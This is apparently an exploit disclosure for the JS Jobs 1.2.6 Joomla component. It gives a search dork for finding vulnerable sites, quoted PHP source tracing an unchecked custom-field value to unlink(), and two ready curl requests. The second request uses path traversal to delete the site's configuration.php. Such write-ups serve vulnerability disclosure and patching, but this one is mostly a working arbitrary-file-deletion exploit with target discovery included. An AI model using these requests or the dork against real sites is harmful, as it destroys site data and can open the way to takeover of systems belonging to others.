# Dork: inurl:"index.php?option=com_jsjobs"
# Exploit Author: qw3rTyTy
# Vendor Homepage: https://www.joomsky.com/
# Software Link: https://www.joomsky.com/5/download/1
# Version: 1.2.6
# Tested on: Debian/nginx/joomla 3.9.0

# Vulnerability details:
# This vulnerability is caused when processing custom userfield.

File:		site/models/job.php
Function:	storeJob
Line:		1240
-------------------------------------

  1215	    //custom field code start
  1216	        $customflagforadd = false;
  1217	        $customflagfordelete = false;
  1218	        $custom_field_namesforadd = array();
  1219	        $custom_field_namesfordelete = array();
  1220	        $userfield = $this->getJSModel(&#039;customfields&#039;)->getUserfieldsfor(2);
  1221	        $params = array();
  1222	        $forfordelete = &#039;&#039;;
  1223	        
  1224	        foreach ($userfield AS $ufobj) {
  1225	            $vardata = &#039;&#039;;
  1226	            if($ufobj->userfieldtype == &#039;file&#039;){
  1227	                if(isset($data[$ufobj->field.&#039;_1&#039;]) && $data[$ufobj->field.&#039;_1&#039;] == 0){
  1228	                    $vardata = $data[$ufobj->field.&#039;_2&#039;];
  1229	                }else{
  1230	                    $vardata = $_FILES[$ufobj->field][&#039;name&#039;];
  1231	                }
  1232	                $customflagforadd=true;
  1233	                $custom_field_namesforadd[]=$ufobj->field;
  1234	            }else{
  1235	                $vardata = isset($data[$ufobj->field]) ? $data[$ufobj->field] : &#039;&#039;;
  1236	            }
  1237	            if(isset($data[$ufobj->field.&#039;_1&#039;]) && $data[$ufobj->field.&#039;_1&#039;] == 1){
  1238	                $customflagfordelete = true;
  1239	                $forfordelete = $ufobj->field;
  1240	                $custom_field_namesfordelete[]= $data[$ufobj->field.&#039;_2&#039;];		//No check.
  1241	            }
  ...snip...
  1323	        // new
  1324	        //removing custom field 
  1325	        if($customflagfordelete == true){
  1326	            foreach ($custom_field_namesfordelete as $key) {
  1327	                $res = $this->getJSModel(&#039;common&#039;)->uploadOrDeleteFileCustom($row->id,$key ,1,2);		//!!!
  1328	            }
  1329	        }

File:		site/models/common.php
Function:	uploadOrDeleteFileCustom
Line:		851
-------------------------------------

   748	        $path = $base . &#039;/&#039; . $datadirectory;
   749	        if (!file_exists($path)) { // create user directory
   750	            $this->makeDir($path);
   751	        }
   752	        $isupload = false;
   753	        $path = $path . &#039;/data&#039;;
   754	        if (!file_exists($path)) { // create user directory
   755	            $this->makeDir($path);
   756	        }
   757	        if($for == 3 )
   758	            $path = $path . &#039;/jobseeker&#039;;
   759	        else
   760	            $path = $path . &#039;/employer&#039;;
   761	
   762	        if (!file_exists($path)) { // create user directory
   763	            $this->makeDir($path);
   764	        }
   ...snip...
   843	        } else { // DELETE FILES
   844	            if ($isdeletefile == 1) {
   845	                if($for == 3){
   846	                    $userpath = $path . &#039;/&#039;.$datafor.&#039;_&#039; . $resumeid . &#039;/customfiles/&#039;;
   847	                }else{
   848	                    $userpath = $path . &#039;/&#039;.$datafor.&#039;_&#039; . $id . &#039;/customfiles/&#039;;
   849	                }
   850	                $file = $userpath.$field;
   851	                unlink($file);		//!!!
   852	            }
   853	            return 1;
   854	        }
   855	    }

#####################################
#PoC:
#####################################

# If an administrator has added custom userfield &#039;ufield926&#039; as field type &#039;file&#039;, attacker are can trigger this vulnerability by send a following requests.

$> curl -X POST -i -H &#039;Cookie: VALID_SESSION_ID=VALID_SESSION_ID&#039; -F &#039;options=com_jsjobs&#039; -F &#039;task=job.savejob&#039; -F &#039;id=&#039; -F &#039;enforcestoppublishjob=666&#039; -F &#039;startpublishing=2019-08-16&#039; -F &#039;stoppublishing=2019-08-16&#039; -F &#039;description=woot&#039; -F &#039;title=woot&#039; -F &#039;ufield926=@./valid_image.jpg&#039; -F &#039;VALID_FORM_TOKEN_FROM_FORMJOB=1&#039; "http://localhost/index.php"

$> curl -X POST -i -H &#039;Cookie: VALID_SESSION_ID=VALID_SESSION_ID&#039; -F &#039;options=com_jsjobs&#039; -F &#039;task=job.savejob&#039; -F &#039;id=666&#039; -F &#039;enforcestoppublishjob=666&#039; -F &#039;startpublishing=2019-08-16&#039; -F &#039;stoppublishing=2019-08-16&#039; -F &#039;description=woot&#039; -F &#039;title=woot&#039; -F &#039;ufield926_1=1&#039; -F &#039;ufield926_2=../../../../../configuration.php&#039; -F &#039;VALID_FORM_TOKEN_FROM_FORMJOB=1&#039; "http://localhost/index.php"

